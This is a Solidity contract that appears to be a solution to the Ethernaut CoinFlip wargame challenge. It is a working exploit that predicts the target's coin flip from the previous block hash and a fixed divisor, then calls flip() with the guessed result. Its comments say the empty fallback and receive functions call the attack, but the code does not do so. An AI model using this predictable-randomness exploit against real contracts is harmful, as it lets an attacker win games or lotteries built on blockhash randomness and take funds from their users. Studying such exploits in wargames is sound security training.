// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import {CoinFlip} from "./CoinFlip.sol";

contract CoinFlipAttack {
    // Solution for Ethernaut CoinFlip challenge
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // The contract we're attacking
    CoinFlip public coinFlipContract;

    // The constructor takes the address of the CoinFlip contract
    constructor(address _coinFlipAddress) {
        coinFlipContract = CoinFlip(_coinFlipAddress);
    }

    // The attack function
    function attack() external {
        bool guess = _guess();
        // Get the next coin flip
        require(coinFlipContract.flip(guess), "Flip failed");
    }

    function _guess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }

    // The fallback function is called when the contract receives a transaction
    fallback() external payable {
        // Call the attack function
    }

    // The receive function is called when the contract receives a transaction
    receive() external payable {
        // Call the attack function
    }
}
